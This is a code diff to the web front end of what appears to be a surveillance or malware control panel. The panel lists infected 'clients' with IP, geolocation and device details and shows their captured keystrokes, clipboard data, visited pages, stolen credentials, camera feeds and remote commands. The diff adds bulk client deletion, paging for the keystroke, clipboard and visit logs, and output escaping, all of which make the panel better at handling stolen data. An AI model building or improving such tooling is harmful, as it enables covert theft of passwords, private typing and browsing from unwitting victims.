@@ -78,7 +78,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 .pnl-b.np{padding:0}
 
 /* CLIENT CARDS */
-.cl{display:flex;gap:10px;padding:10px 14px;border-bottom:1px solid var(--border);transition:background .1s;cursor:default}
+.cl{display:flex;gap:10px;padding:10px 14px 10px 28px;border-bottom:1px solid var(--border);transition:background .1s;cursor:default;position:relative}
 .cl:hover{background:var(--panel2)}
 .cl:last-child{border-bottom:none}
 .cl .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;margin-top:5px}
@@ -413,6 +413,10 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
             <div class="pnl-h">
                 <h2>Clients</h2>
                 <span class="badge" id="cl-badge">0</span>
+                <div style="margin-left:auto;display:flex;gap:6px;align-items:center">
+                    <button class="btn" style="font-size:.65rem;padding:3px 8px" onclick="toggleSelectAllClients()" title="Select/deselect all clients">☑ Select All</button>
+                    <button class="btn danger" style="font-size:.65rem;padding:3px 8px" onclick="bulkDeleteClients()" title="Delete selected clients">🗑 Delete Selected</button>
+                </div>
             </div>
             <div class="pnl-b np" id="cl-list"><div class="empty">Loading...</div></div>
         </div>
@@ -1060,9 +1064,9 @@ $$('.tab').forEach(tab => {
         if (v === 'videos') loadVideos();
         if (v === 'devices') renderDevices();
         if (v === 'cameras') loadCameraFeeds();
-        if (v === 'keys') loadKeystrokes();
-        if (v === 'clipboard') loadClipboard();
-        if (v === 'visits') loadVisits();
+        if (v === 'keys') loadKeystrokes(true);
+        if (v === 'clipboard') loadClipboard(true);
+        if (v === 'visits') loadVisits(true);
         if (v === 'credentials') loadCredentials();
         if (v === 'commands') updateCmdTargets();
         if (v === 'settings') { loadConfig(); loadStorage(); }
@@ -1430,48 +1434,65 @@ async function loadVideos() {
     }).join('') + '</div>';
 }
 
-async function loadKeystrokes() {
-    const keys = await api('/api/keystrokes?limit=100' + filterParam());
+let keysLimit = 100, clipLimit = 50, visitsLimit = 100;
+
+async function loadKeystrokes(reset) {
+    if (reset) keysLimit = 100;
+    const keys = await api('/api/keystrokes?limit=' + keysLimit + filterParam());
     if (!keys) return;
     const c = $('#key-log');
     if (!keys.length) { c.innerHTML = '<div class="empty">No keystrokes captured</div>'; return; }
-    c.innerHTML = keys.map(k => {
+    const rows = keys.map(k => {
         const highlighted = k.keys.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
         return `<div class="key-entry">
-            <div class="key-hdr"><span class="key-id">${k.clientId}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
-            ${k.url ? `<div class="key-url">${k.url}</div>` : ''}
+            <div class="key-hdr"><span class="key-id">${escHtml(k.clientId)}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
+            ${k.url ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
             <div class="key-text">${highlighted}</div>
         </div>`;
     }).join('');
+    const loadMore = keys.length === keysLimit
+        ? `<div style="text-align:center;padding:14px"><button class="btn" onclick="keysLimit+=${100};loadKeystrokes()">Load more (${keysLimit}/${keysLimit} shown)</button></div>`
+        : `<div style="text-align:center;padding:8px;color:var(--dim);font-size:.68rem">All ${keys.length} entries shown</div>`;
+    c.innerHTML = rows + loadMore;
 }
 
-async function loadClipboard() {
-    const clips = await api('/api/clipboard?limit=50' + filterParam());
+async function loadClipboard(reset) {
+    if (reset) clipLimit = 50;
+    const clips = await api('/api/clipboard?limit=' + clipLimit + filterParam());
     if (!clips) return;
     const c = $('#clip-log');
     if (!clips.length) { c.innerHTML = '<div class="empty">No clipboard data</div>'; return; }
-    c.innerHTML = clips.map(cl => `
+    const rows = clips.map(cl => `
         <div class="clip-entry">
-            <div class="clip-hdr"><span class="clip-id">${cl.clientId}</span><span class="clip-time">${fmtTime(cl.timestamp)}</span></div>
+            <div class="clip-hdr"><span class="clip-id">${escHtml(cl.clientId)}</span><span class="clip-time">${fmtTime(cl.timestamp)}</span></div>
             <div class="clip-text">${escHtml(cl.content)}</div>
         </div>
     `).join('');
+    const loadMore = clips.length === clipLimit
+        ? `<div style="text-align:center;padding:14px"><button class="btn" onclick="clipLimit+=${50};loadClipboard()">Load more (${clipLimit}/${clipLimit} shown)</button></div>`
+        : `<div style="text-align:center;padding:8px;color:var(--dim);font-size:.68rem">All ${clips.length} entries shown</div>`;
+    c.innerHTML = rows + loadMore;
 }
 
-async function loadVisits() {
-    const visits = await api('/api/visits?limit=100' + filterParam());
+async function loadVisits(reset) {
+    if (reset) visitsLimit = 100;
+    const visits = await api('/api/visits?limit=' + visitsLimit + filterParam());
     if (!visits) return;
     const c = $('#visit-log');
     if (!visits.length) { c.innerHTML = '<div class="empty">No page visits</div>'; return; }
-    c.innerHTML = visits.map(v => `
+    const rows = visits.map(v => `
         <div class="visit-entry">
-            <span class="v-id">${v.clientId}</span>
+            <span class="v-id">${escHtml(v.clientId)}</span>
             <span class="v-url" title="${escHtml(v.url)}">${escHtml(v.url)}</span>
             <span class="v-title">${escHtml(v.title)}</span>
             <span class="v-time">${fmtTime(v.timestamp)}</span>
         </div>
     `).join('');
+    const loadMore = visits.length === visitsLimit
+        ? `<div style="text-align:center;padding:14px"><button class="btn" onclick="visitsLimit+=${100};loadVisits()">Load more (${visitsLimit}/${visitsLimit} shown)</button></div>`
+        : `<div style="text-align:center;padding:8px;color:var(--dim);font-size:.68rem">All ${visits.length} entries shown</div>`;
+    c.innerHTML = rows + loadMore;
 }
 
 async function loadCredentials() {
@@ -1841,12 +1862,13 @@ function renderClients(clients) {
         const tagBadges  = tagList.map(t => `<span class="cl-label-badge">${esc(t)}</span>`).join('');
         const badgeRow   = (labelBadge || tagBadges) ? `<div style="margin-bottom:4px">${labelBadge}${tagBadges}</div>` : '';
 
-        return `<div class="cl${isPinned ? ' cl-pinned' : ''}">
-            <div class="dot ${cl.online ? 'on' : 'off'}"></div>
+        return `<div class="cl${isPinned ? ' cl-pinned' : ''}" data-client-id="${id}">
+            <input type="checkbox" class="cl-select" data-id="${id}" onclick="event.stopPropagation()" style="position:absolute;top:10px;left:8px;cursor:pointer;width:14px;height:14px">
+            <div class="dot ${cl.online ? 'on' : 'off'}" style="margin-left:18px"></div>
             <div class="inf">
                 <div class="cid" title="${id}">${isPinned ? '[P] ' : ''}${id} <button class="copy-btn" onclick="event.stopPropagation();copyText('${id}',this)">Copy</button></div>
                 ${badgeRow}
-                <div class="meta">${cl.online ? 'Online' : 'Offline'} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${cl.ip || ''}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${cl.ip || ''}</span>${idleH}${hiddenH}${scrollH}</div>
+                <div class="meta">${cl.online ? 'Online' : ('Offline · ' + fmtAgo(cl.lastSeen))} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${cl.ip || ''}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${cl.ip || ''}</span>${idleH}${hiddenH}${scrollH}</div>
                 ${locH}${geoH}
                 <div class="dev">${cl.screen || ''} - ${cl.language || ''} - ${cl.timezone || ''} ${dur ? '- ' + dur : ''}</div>
                 <div class="dev" style="opacity:.55">${(cl.userAgent || '').slice(0, 100)}</div>
@@ -2019,6 +2041,25 @@ async function loadMap() {
 // ═══════════════════════════════════════════════════════════════
 async function deleteClient(id) {
     try { await apiFetch(`/api/client/${id}`, { method: 'DELETE' }); } catch(e) { showError('deleteClient', e); }
+    refreshAll();
+}
+
+function toggleSelectAllClients() {
+    const boxes = $$('#cl-list .cl-select');
+    const allChecked = boxes.length > 0 && [...boxes].every(b => b.checked);
+    boxes.forEach(b => b.checked = !allChecked);
+}
+
+async function bulkDeleteClients() {
+    const selected = [...$$('#cl-list .cl-select:checked')].map(b => b.dataset.id);
+    if (!selected.length) { toast('⚠️ No clients selected'); return; }
+    if (!confirm(`Delete ${selected.length} client(s)?`)) return;
+    toast(`🗑 Deleting ${selected.length} clients...`);
+    let done = 0;
+    for (const id of selected) {
+        try { await apiFetch(`/api/client/${id}`, { method: 'DELETE' }); done++; } catch {}
+    }
+    toast(`✅ Deleted ${done}/${selected.length} clients`);
     refreshAll();
 }
 
